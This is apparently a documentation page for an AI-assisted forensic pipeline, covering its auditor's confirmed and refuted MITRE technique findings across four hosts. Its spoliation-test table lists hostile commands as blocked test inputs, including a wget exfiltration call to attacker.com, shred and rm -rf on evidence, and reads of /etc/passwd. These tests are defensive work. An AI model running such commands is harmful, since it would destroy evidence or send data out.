---
title: Accuracy & Evidence Integrity
nav_order: 10
permalink: /accuracy
---

# Accuracy & Evidence Integrity

The primary accuracy claim in VERITAS is not a detection rate. It is a verification
guarantee: **every CONFIRMED finding is backed by a positive return value from a real
forensic tool call.** The numbers below are evidence for that claim.

---

## Forensic Auditor Results — 4 Hosts

| Host | Candidates | Confirmed | Refuted | Inconclusive |
|------|-----------|-----------|---------|--------------|
| nfury (10.3.58.6) | 19 | 15 | 4 | 0 |
| tdungan (10.3.58.7) | 17 | 13 | 4 | 0 |
| nromanoff (10.3.58.5) | 7 | 3 | 4 | 0 |
| rocba (192.168.1.5) | 5 | 1 | 4 | 0 |
| **Total** | **48** | **32** | **16** | **0** |

**100% of confirmed findings** have a physical artifact citation traceable to a specific
tool call in the append-only audit log. Every confirmed technique can be independently
reproduced with one shell command on the same mounted image.

The refuted count is 4 per host. The refuted *techniques* are not identical across hosts —
T1569.002 (PsExec) is **confirmed** on nfury (binary found on disk) and **refuted** on
tdungan (memory signal, no binary present). The Auditor makes case-specific decisions.
The consistent pattern is the class of signal — memory-resident technique indicators
without disk corroboration — not a fixed output count.

---

## The Refutals Are the Evidence

The 16 refuted findings are not failures. They are the architecture working.

The same four techniques were refuted on every host: T1071.001, T1134, T1547.001, T1574.
All four are memory-resident signals with no disk corroboration. The Auditor consistently
distinguishes between a memory keyword match and a confirmed physical artifact.

**T1071.001 on nfury — the clearest case:**
Memory triage flagged active C2 web protocol from the string `established` in netscan
output. The Auditor ran `windows.netscan` and checked all 432 connection records. Every
ESTABLISHED and CLOSE\_WAIT connection resolved to Apple, Microsoft, or Google CDN
infrastructure. Returned REFUTED: no active HTTP/HTTPS C2 connections found.

**T1547.001 on nfury — exhaustive checking:**
Memory triage flagged registry Run key persistence. The Auditor checked the SOFTWARE hive,
SAM, SECURITY, BCD, Syscache, and 11 NTUSER.DAT files across all user profiles over three
challenge rounds. The only Run key entries: Windows Sidebar entries dated 2009-07-14 —
the stock Windows 7 installation timestamp. Returned REFUTED: signal fired on the key path
in memory, not on a malicious value in the key.

**T1055 on rocba — fail-safe under resource pressure:**
Round 1: `windows.malfind` timed out after 120 seconds. Returned INCONCLUSIVE — not
CONFIRMED. Round 2: recovered one VAD record before timeout. `MsMpEng.exe` with two
`PAGE_EXECUTE_READWRITE` VadS regions and x64 shellcode prologue. Returned CONFIRMED.
Timeout produces INCONCLUSIVE, not a hallucinated finding.

---

## Triage Layer Honest Assessment

The corpus-calibrated detection layer is a **proof of concept**.

| Metric | Value | Context |
|--------|-------|---------|
| Pass 1 contribution to candidates | 2 of 48 | Corpus weights, deterministic sweep |
| Pass 2 contribution to candidates | 46 of 48 | Agentic investigation |
| Techniques confirmed by Auditor | 32 of 48 (67%) | Auditor is the precision layer |
| Techniques refuted by Auditor | 16 of 48 (33%) | Correct — memory signals without disk evidence |
| MITRE techniques in corpus weights | 9 | MalwareBazaar + HybridAnalysis signals |
| FP rate on benign endpoints | High | Designed for known-suspicious images, not live monitoring |

The triage layer is deliberately wide. The Auditor provides the precision.

---

## Sysmon Adversarial Training — Honest Scope

The adversarial Red/Blue training loop (`brain.py`) operates on Sysmon live telemetry.
Sysmon event fields (`ProcessGuid`, `CommandLine`, `ParentImage`) are absent from static
disk forensic output. These signals do not independently drive disk-forensic detections
in the current pipeline. The deployment path for this component is a live Sysmon endpoint.

Technical details are documented in [Domain Gap Analysis](/docs/domain_gap_results).

---

## Spoliation Gate Tests — `tests/test_spoliation.py`

The MCP validator is tested for evidence-tampering resistance. 13 tests, 4 gates, all pass.

```
pytest tests/test_spoliation.py -v
# 13 passed in 0.54s
```

| Test | Command | Gate | Result |
|------|---------|------|--------|
| `test_gate1_shred_blocked` | `shred /mnt/nfury/pagefile.sys` | Gate 1 — hard-blocked | BLOCKED |
| `test_gate1_wget_exfil_blocked` | `wget http://attacker.com/exfil` | Gate 1 — hard-blocked | BLOCKED |
| `test_gate1_sudo_blocked` | `sudo rm -rf /mnt/nfury` | Gate 1 — hard-blocked | BLOCKED |
| `test_gate1_command_substitution_blocked` | `echo $(cat /etc/passwd)` | Gate 1 — hard-blocked | BLOCKED |
| `test_gate1_backtick_substitution_blocked` | `` strings `which bash` `` | Gate 1 — hard-blocked | BLOCKED |
| `test_gate2_bash_not_in_allowlist` | `bash -c "rm /mnt/nfury/evidence.e01"` | Gate 2 — allowlist | BLOCKED |
| `test_gate2_python3_inline_exec_blocked` | `python3 -c 'import os; os.remove(...)'` | Gate 2 — python3 -c guard | BLOCKED |
| `test_gate2_find_exec_rm_blocked` | `find /mnt -exec rm {} \;` | Gate 2 — -exec guard | BLOCKED |
| `test_gate2_xargs_rm_blocked` | `find /mnt ... \| xargs rm` | Gate 2 — xargs guard | BLOCKED |
| `test_gate3_redirect_outside_reports_blocked` | `strings ntoskrnl.exe > /tmp/out.txt` | Gate 3 — redirect guard | BLOCKED |
| `test_gate3_redirect_to_etc_blocked` | `cat SAM > /etc/shadow` | Gate 3 — redirect guard | BLOCKED |
| `test_gate3_audit_log_write_blocked` | `echo fake > reports/audit_log.jsonl` | Gate 3 — audit log deny | BLOCKED |
| `test_gate4_pipe_inside_quotes_not_split` | `grep -iE '(http\|https\|ftp)' /mnt/...` | Gate 4 — quote-aware parser | **ALLOWED** (correct) |

Gate 4 is the correctness test: `|` inside single-quoted arguments must not be treated as a
pipeline separator. Without quote-awareness, `https` and `ftp)` would be rejected as
unlisted binaries, blocking legitimate forensic regex invocations.

---

## Negative Ground Truth — Techniques Confirmed Absent

These techniques were investigated and REFUTED on each host. The refutal is not a miss —
it is the Auditor confirming via physical evidence that the technique did not execute as
described by the triage signal.

### T1071.001 — Application Layer Protocol: Web Protocols

| Host | Signal | Auditor action | Verdict |
|------|--------|----------------|---------|
| nfury | `established` string in `windows.netscan` memory output | Ran `windows.netscan`, read 432 connection records; all resolved to Apple/Microsoft/Google CDN | **REFUTED** |
| rocba | `established` in netscan | Same check; C2 relay node had no active HTTP sessions at time of acquisition | **REFUTED** |

T1071.001 fires consistently from TCP state strings in any live Windows memory capture. The
Auditor correctly distinguishes a TCP state keyword from an active malicious C2 session.

### T1134 — Access Token Manipulation

| Host | Signal | Auditor action | Verdict |
|------|--------|----------------|---------|
| nfury | Memory token anomaly in Volatility output | Searched for `SeDebugPrivilege` in LSASS context, process token grants; no active manipulation artifact found on disk | **REFUTED** |
| tdungan | Same | Same approach; no disk artifact | **REFUTED** |
| rocba | Same | Same approach; C2 relay has minimal user context, no token manipulation artifacts | **REFUTED** |

T1134 memory signals appear in normal Windows privilege contexts. Absent a disk artifact
(token impersonation binary, event log entry 4624 with elevated token), the technique is
not confirmed.

### T1547.001 — Registry Run Keys / Startup Folder

| Host | Signal | Auditor action | Verdict |
|------|--------|----------------|---------|
| nfury | Memory match on Run key path | Checked SOFTWARE hive, SAM, SECURITY, BCD, Syscache, 11 NTUSER.DAT files across all user profiles over 3 challenge rounds; only Windows Sidebar entries dated 2009-07-14 (stock Win7 timestamp) | **REFUTED** |
| tdungan | Memory match on Run key path | Same exhaustive check; no attacker-placed Run key entries | **REFUTED** |
| rocba | Memory match | C2 relay has no persistence mechanism by design — attacker deliberately left no Run keys | **REFUTED** |

The nfury case is the clearest: the signal fired on the key path in memory, but the
Auditor's exhaustive hive check over 3 rounds found only stock Windows installation entries.

### T1574 — Hijack Execution Flow

| Host | Signal | Auditor action | Verdict |
|------|--------|----------------|---------|
| nfury | VAD region with RWX permissions | Searched for hijack indicators (DLL search order abuse, PATH manipulation, COM object registry keys); no disk artifact confirmed | **REFUTED** |
| tdungan | Same | Same check; anonymous RWX VAD present but no corresponding hijack artifact on disk | **REFUTED** |
| rocba | Same | Same check; RWX VAD in MsMpEng.exe attributed to T1055 (process injection), not hijack execution | **REFUTED** |

Note: rocba's MsMpEng.exe RWX VAD was confirmed as T1055 (process injection) not T1574.
The Auditor correctly attributed the artifact to the more specific and physically supported technique.

### T1569.002 — System Services: Service Execution (PsExec) — per-host variation

This technique shows the Auditor making case-specific decisions, not running a fixed pattern:

| Host | Verdict | Physical evidence |
|------|---------|------------------|
| nfury | **CONFIRMED** | `psexesvc.exe` found on disk at expected path |
| tdungan | **REFUTED** | Memory signal only; binary not present on disk |

Same technique. Same Auditor. Two different hosts. Two different verdicts based on what was
physically present on each disk.

---

## Evidence Integrity

Every confirmed finding is reproducible without the AI:

1. Open `reports/audit_log.jsonl`
2. Find the Auditor tool call for the confirmed technique
3. Run the exact command on the same mounted image
4. The output matches

The audit log is append-only — written via `os.open + os.write` before each
`subprocess.run` call. It cannot be overwritten through a tool call. Blocked commands
log their `blocked_reason`. The chain of custody is complete from invocation to verdict.
